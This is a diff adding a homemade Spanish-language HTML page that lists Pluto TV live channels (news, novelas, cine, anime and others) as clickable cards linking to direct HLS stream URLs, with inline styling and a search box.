@@ -1,0 +1,728 @@
+﻿<!DOCTYPE html>
+<html dir='ltr' lang='es' prefix='og: http://ogp.me/ns#' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<!-- Basic data -->
+<meta charset='UTF-8'/>
+<meta content='article' property='og:type'/>
+<!-- Responsive viewport -->
+<meta content='width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0' name='viewport'/>
+<!-- Title -->
+<title>PELIS2022-PAG</title>
+<style type='text/css'>
+*{margin:0;padding:0;box-sizing:border-box;list-style:grid;}
+a{text-decoration:none;}
+body{background:#000;font-family:Nunito,sans-serif;}
+
+.cards{display:grid;grid-template-columns:repeat(5,1fr);grid;align-items: stretch;
+    justify-items: stretch;}
+
+.card{text-align:center;}
+.card img{
+    padding: 0px;
+    padding-top: 0px;
+    width: 90%;
+    height: 70%;
+border-radius:7px;}
+
+.card span{padding:0 .3rem;display:none;}
+a{-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-tap-highlight-color:transparent;} 
+.form__group{position:relative;padding:15px 0 0;margin:0 auto;margin-top:10px;margin-bottom:1rem;width:90%;}
+.form__field{font-family:inherit;width:100%;border:0;border-bottom:2px solid #9b9b9b;outline:0;font-size:1.3rem;color:#fff;padding:7px 0;background:0 0;transition:border-color .2s;}
+.form__field::placeholder{color:transparent;}
+.form__field:placeholder-shown~.form__label{font-size:1.3rem;cursor:text;top:20px;}
+.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:#fff;}
+.form__field:focus{padding-bottom:6px;font-weight:700;border-width:3px;border-image:linear-gradient(to right,red,#008cf7,red);border-image-slice:1;}
+.form__field:focus~.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:red;font-weight:700;}
+.form__field:invalid,.form__field:required{box-shadow:none;}
+
+
+
+/*Fix: Unnecessary elements removed*/
+.widget-item-control,.item-control.blog-admin,
+.continue,.loadmore,.thread-chrome.thread-collapsed,
+.singleton-element:not(.cookie-choices-info),
+.noAllowNewComments .comment-reply,
+.comments .hidden {display:none;}
+/*Fix: Show lightbox*/
+.CSS_LIGHTBOX{z-index:90001!important;}
+/*Fix: Image responsive*/
+a[imageanchor]:not([style*=float]){margin-right:0!important;margin-left:0!important;}
+.widget-content img,
+img[data-original-height],
+img[data-original-width] {height: auto;}
+/*Fix: Comment Editor*/
+#comment-editor{border:0;width:100%;min-height:220px;}
+.box{margin:0 auto;margin-bottom:2rem;width:60%;display:flex;align-items:center;}
+#caps{font-size:1.3rem;}
+.progress{background:#212042;width:100%;height:15px;border-radius:10px;}
+.progress-bar{width:0;opacity:0;height:15px;background:linear-gradient(to right,#228ee9,#1b7dbf);border-radius:10px;display:flex;justify-content:center;align-items:center;transition:1s ease;}
+.box span{padding-left:10px;color:#fff;}
+
+
+
+.xaviec {
+    background: #000;
+    position: fixed;
+    top: -16px;
+    right: -0.5em;
+    width: 20%;
+}
+
+
+
+.card h6{
+background:#212042;
+position:auto;
+margin-bottom:20%;
+color:#fff;
+font-size:0.9.5rem;
+border-radius:7px;
+}
+
+
+/* prueba de paginacion */
+.paginacion {
+	padding-top:10%;
+}
+
+.paginacion ul {
+	list-style:none;
+	text-align: center;
+}
+
+.paginacion ul li {
+	display:inline-block;
+	margin-right:5px;
+}
+
+.paginacion ul li a {
+	display:block;
+	padding:5px 10px;
+	color:#fff;
+	background:#024959;
+	text-decoration: none;
+}
+
+.paginacion ul li a:hover {
+	background:#ff0000;
+}
+
+.paginacion ul li .active {
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000;
+    transition-delay: 0.1s;
+}
+
+
+/* luz de neon alrededor */
+
+
+img:hover{
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000; /*efecto con el mouse*/
+}
+
+
+
+
+
+
+        /*          Pagination
+        ***************************/
+        /*Pagination Links Background*/
+
+
+
+.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.nav-links a,.nav-links span,.tagcloud a{background-color: #313036 }
+        @media screen and (max-width:62em){
+            .Menu>ul>li{border-bottom-color: #313036 }
+            .Menu .sub-menu a{background-color: #313036 }
+        }
+        /*Pagination Links Background Hover*/.menu-azlist ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{background-color: #de1212 }
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a:hover{background-color: #de1212 }
+        }
+        /*Pagination Links Color*/.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.tagcloud a{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a{color: #fff !important}
+        }
+        /*Pagination Links Color Hover*/.Menu li.menu-azlist:hover ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu li:hover .sub-menu li:hover a,.Menu .sub-menu li:hover:before{color: #fff !important}
+        }
+
+
+
+
+
+
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+}
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+    --dark-2: rgba(0,0,0,.2);
+    --dark-5: rgba(0,0,0,.5);
+    --light-1: rgba(255,255,255,.1);
+    --light-2: rgba(255,255,255,.2);
+    --light-7: rgba(255,255,255,.7);
+    --success: #28a745;
+    --danger: #FF5757;
+    --warning: #ffc107;
+    --size: 1rem;
+    --f-size: 1rem;
+    --family: 'Work Sans';
+}
+
+
+
+
+
+.pagination {
+    text-align: center;
+    font-weight: 700;
+    margin-bottom: var(--size);
+}
+
+a:-webkit-any-link {
+    color: -webkit-link;
+    cursor: pointer;
+    text-decoration: underline;
+}
+
+.btn.snd, .page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+.btn, button, [type=button], [type=reset], [type=submit], .pagination a, .extend, .tagcloud a, a.comment-reply-link {
+    cursor: pointer;
+    padding: .5rem 0.1rem;
+    display: inline-block;
+    vertical-align: top;
+    text-align: center;
+    line-height: 2rem;
+    width: auto;
+    background-color: var(--light-2);
+    color: var(--light);
+    min-width: 3rem;
+    border: 0;
+}
+
+
+.page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+
+
+
+
+
+
+
+.boton {
+    width: 8em;
+    height: 2em;
+border: 1px solid #2e5c8b;; /*anchura, estilo y color borde*/
+padding: 8px; /*espacio alrededor texto*/
+background-color: #20f504; /*color botón*/
+color: #ffffff; /*color texto*/
+text-decoration: none; /*decoración texto*/
+text-transform: uppercase; /*capitalización texto*/
+font-family: 'Helvetica', sans-serif; /*tipografía texto*/
+border-radius: 50px; /*bordes redondos*/
+    position: absolute;
+    top: 2em;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</style>
+<link href='https://fonts.googleapis.com/css2?family=Nunito&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Lato&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Montserrat&display=swap' rel='stylesheet'/>
+
+
+
+<nav class="navigation pagination">
+<div class="nav-links">
+ <!--  <a href="" ></a>
+       <a href="" ></a>   -->
+<a class="page-link current" href="C:\Users\Terminal 2\Documents\A Escritorio julio 2022\GITHUB PELIS Y SERIES PARA SUBIR A INTERNET\Nueva carpeta (2)\PELIS2022\PLUTO.html"_blank" >PLUTO TV</a>
+<a class="page-link" href="C:\Users\Terminal 2\Documents\A Escritorio julio 2022\GITHUB PELIS Y SERIES PARA SUBIR A INTERNET\Nueva carpeta (2)\PELIS2022\VIX.html" >VIX TV</a>
+
+ <!--   <a href="javascript:void(0)" class="extend"></a>
+        <a class="page-link" href="" ></a>  -->
+
+
+</div>
+</nav>
+
+
+
+
+
+</head>
+<body>
+
+
+
+
+
+
+
+<!--LAS DEMÁS-->
+<div class="xaviec">
+<div class="form__group field">
+<input autocomplete="off" type="input" onkeyup="myFunction()" class="form__field" placeholder="Buscar" name="name" id="myInput" required />
+<label for="name" class="form__label">Buscar</label>
+</div></div></div><br><br><br><br>
+<center><ul class="cards" id="cards">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li> <a href="	http://stitcher-ipv4.pluto.tv/v1/stitch/embed/hls/channel/60d3583ef310610007fb02b1livestitch/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=1YNY&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&profileLimit=&profileFloor=&embedPartner=samsung-tvplus&profilesFromStream=true	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Euronews_2016_logo.svg/1000px-Euronews_2016_logo.svg.png	"/> <h6>	EuroNews	</h6></a></li>
+<li> <a href="	https://stitcher-ipv4.pluto.tv/stitch/hls/channel/5cf96cc422df39f1a338d165/master.m3u8?deviceId=0&deviceVersion=0&appVersion=0&deviceType=0&deviceMake=0&sid=293d&deviceDNT=0&deviceModel=0&already_redirected=true	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Telemundo_logo_2018.svg/284px-Telemundo_logo_2018.svg.png	"/> <h6>	TELEMUNDO NOVELAS	</h6></a></li>
+<li> <a href="	https://stitcher-ipv4.pluto.tv/stitch/hls/channel/5cf96cc422df39f1a338d165/master.m3u8?deviceId=0&deviceVersion=0&appVersion=0&deviceType=0&deviceMake=0&sid=293d&deviceDNT=0&deviceModel=0&already_redirected=true	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Telemundo_logo_2018.svg/1213px-Telemundo_logo_2018.svg.png	"/> <h6>	TELEMUNDO NOVELAS 	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5f523aa5523ae000074745ec/master.m3u8?advertisingId=&appName=web&appVersion=5.13.0-b5a9d23b0997348f836f00c3fae7a78598f80007&app_name=web&clientDeviceType=0&clientID=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&clientModelNumber=na&deviceDNT=false&deviceId=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&deviceLat=20.9176&deviceLon=-101.7970&deviceMake=Android%2BBrowser&deviceModel=web&deviceType=web&deviceVersion=4.0&marketingRegion=VE&serverSideAds=true&sessionID=95b91f7b-5fea-11eb-a30a-0242ac110002&sid=95b91f7b-5fea-11eb-a30a-0242ac110002&userId=	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/thumb/c/cc/Telefe_%28nuevo_logo%29.png/800px-Telefe_%28nuevo_logo%29.png	"/> <h6>	PLUTO NOTICIAS  	</h6></a></li>
+<li> <a href="	https://stitcher-ipv4.pluto.tv/stitch/hls/channel/5defde6d6c07b50009cf0757/master.m3u8?advertisingId=&appName=web&appVersion=5.15.0-cb3de003a5ed7a595e0e5a8e1a8f8f30ad8ed23a&app_name=web&clientDeviceType=0&clientID=1eea50e2-1023-4937-8ef9-336fcffb8d82&clientModelNumber=na&deviceDNT=false&deviceId=1eea50e2-1023-4937-8ef9-336fcffb8d82&deviceLat=21.0180&deviceLon=-101.2407&deviceMake=Android%2BBrowser&deviceModel=web&deviceType=web&deviceVersion=4.0&marketingRegion=VE&serverSideAds=true&sessionID=021906df-85ee-11eb-b4b0-0242ac110002&sid=021906df-85ee-11eb-b4b0-0242ac110002&userId=&already_redirected=true	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5defde6d6c07b50009cf0757/colorLogoPNG.png	"/> <h6>	NUESTRO CINE	</h6></a></li>
+<li> <a href="	http://service-stitcher.clusters.pluto.tv/stitch/hls/channel/609059dc63be6e0007b4eca6/master.m3u8?advertisingId=&appName=web&appVersion=unknown&appStoreUrl=&architecture=&buildVersion=&clientTime=0&deviceDNT=0&deviceId=bff111e2-6307-11eb-b3fa-019cb96f121b&deviceMake=Chrome&deviceModel=web&deviceType=web&deviceVersion=unknown&includeExtendedEvents=false&sid=f9d5191c-e833-44e1-b5c5-067f5a57a102&userId=&serverSideAds=true	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/609059dc63be6e0007b4eca6/colorLogoPNG.png	"/> <h6>	CINE CLÁSICO 	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5ee8d84bfb286e0007285aad/master.m3u8?advertisingId=&appName=web&appVersion=5.13.0-b5a9d23b0997348f836f00c3fae7a78598f80007&app_name=web&clientDeviceType=0&clientID=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&clientModelNumber=na&deviceDNT=false&deviceId=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&deviceLat=20.9176&deviceLon=-101.7970&deviceMake=Android%2BBrowser&deviceModel=web&deviceType=web&deviceVersion=4.0&marketingRegion=VE&serverSideAds=true&sessionID=00ea8f20-5fe7-11eb-b7f1-0242ac110002&sid=00ea8f20-5fe7-11eb-b7f1-0242ac110002&userId=	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5ee8d84bfb286e0007285aad/colorLogoPNG.png	"/> <h6>	FASHION HD PLUTO  	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5dd6ab8056beb000091fc6b6/master.m3u8?advertisingId=&appName=web&appVersion=5.13.0-b5a9d23b0997348f836f00c3fae7a78598f80007&app_name=web&clientDeviceType=0&clientID=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&clientModelNumber=na&deviceDNT=false&deviceId=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&deviceLat=20.9176&deviceLon=-101.7970&deviceMake=Android%2BBrowser&deviceModel=web&deviceType=web&deviceVersion=4.0&marketingRegion=VE&serverSideAds=true&sessionID=f6ccb55c-5fe7-11eb-b7f1-0242ac110002&sid=f6ccb55c-5fe7-11eb-b7f1-0242ac110002&userId=	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd6ab8056beb000091fc6b6/colorLogoPNG.png	"/> <h6>	HOGAR PLUTO TV  	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5dcddfbdb7cf0e0009ae09ea/master.m3u8?advertisingId=&appName=web&appVersion=5.13.0-b5a9d23b0997348f836f00c3fae7a78598f80007&app_name=web&clientDeviceType=0&clientID=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&clientModelNumber=na&deviceDNT=false&deviceId=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&deviceLat=20.9176&deviceLon=-101.7970&deviceMake=Android%2BBrowser&deviceModel=web&deviceType=web&deviceVersion=4.0&marketingRegion=VE&serverSideAds=true&sessionID=727fd000-5fe9-11eb-affa-0242ac110002&sid=727fd000-5fe9-11eb-affa-0242ac110002&userId=	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcddfbdb7cf0e0009ae09ea/colorLogoPNG.png	"/> <h6>	PLUTO VIAJES  	</h6></a></li>
+<li> <a href="	https://stitcher-ipv4.pluto.tv/stitch/hls/channel/5f2acdab16f5b3000721ae2c/master.m3u8?advertisingId=&appName=web&appVersion=5.13.0-b5a9d23b0997348f836f00c3fae7a78598f80007&app_name=web&clientDeviceType=0&clientID=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&clientModelNumber=na&deviceDNT=false&deviceId=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&deviceLat=20.9176&deviceLon=-101.7970&deviceMake=Android%2BBrowser&deviceModel=web&deviceType=web&deviceVersion=4.0&marketingRegion=VE&serverSideAds=true&sessionID=5d9416dd-5feb-11eb-ad61-0242ac110002&sid=5d9416dd-5feb-11eb-ad61-0242ac110002&userId=&already_redirected=true	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5f2acdab16f5b3000721ae2c/colorLogoPNG.png	"/> <h6>	OHMI MASCOTA PLUTO 	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/609ae5cd48d3200007b0a98e/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/609ae5cd48d3200007b0a98e/colorLogoPNG.png	"/> <h6>	SOUTH PARK	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/6054ab20a365c70007e4fd44/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/6054ab20a365c70007e4fd44/colorLogoPNG.png	"/> <h6>	GARFIELD	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5dcde0657444a40009cd2422/master.m3u8?advertisingId=&appName=web&appVersion=5.13.0-b5a9d23b0997348f836f00c3fae7a78598f80007&app_name=web&clientDeviceType=0&clientID=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&clientModelNumber=na&deviceDNT=false&deviceId=b2e8f62a-48c7-4efe-9c4e-7294acf9e404&deviceLat=20.9176&deviceLon=-101.7970&deviceMake=Android%2BBrowser&deviceModel=web&deviceType=web&deviceVersion=4.0&marketingRegion=VE&serverSideAds=true&sessionID=5d9416dd-5feb-11eb-ad61-0242ac110002&sid=5d9416dd-5feb-11eb-ad61-0242ac110002&userId=	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde0657444a40009cd2422/colorLogoPNG.png	"/> <h6>	COCINA PLUTO TV  	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcb62e63d4d8f0009f36881/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcb62e63d4d8f0009f36881/colorLogoPNG.png	"/> <h6>	Pluto TV Cine Acción	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcdde78f080d900098550e4/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcdde78f080d900098550e4/colorLogoPNG.png	"/> <h6>	Pluto TV Cine Comedia	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcddf1ed95e740009fef7ab/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcddf1ed95e740009fef7ab/colorLogoPNG.png	"/> <h6>	Pluto TV Cine Terror	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcddfbdb7cf0e0009ae09ea/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcddfbdb7cf0e0009ae09ea/colorLogoPNG.png	"/> <h6>	Pluto TV Viajes	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcddfcb229eff00091b6bdf/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcddfcb229eff00091b6bdf/colorLogoPNG.png	"/> <h6>	Pluto TV Cine Drama	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde0657444a40009cd2422/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde0657444a40009cd2422/colorLogoPNG.png	"/> <h6>	Pluto TV Cocina	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde07af1c85b0009b18651/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde07af1c85b0009b18651/colorLogoPNG.png	"/> <h6>	Pluto TV Deportes	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde0cc2efd2700090b7ff4/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde0cc2efd2700090b7ff4/colorLogoPNG.png	"/> <h6>	Pluto TV Novelas	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde1317578340009b751d0/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde1317578340009b751d0/colorLogoPNG.png	"/> <h6>	Pluto TV Series	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde17bf6591d0009839e02/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde17bf6591d0009839e02/colorLogoPNG.png	"/> <h6>	Pluto TV Anime	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde197f6591d0009839e04/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde197f6591d0009839e04/colorLogoPNG.png	"/> <h6>	Pluto TV Reality	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde27ffae9520009c0c75a/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde27ffae9520009c0c75a/colorLogoPNG.png	"/> <h6>	Pluto TV Investiga	</h6></a></li>
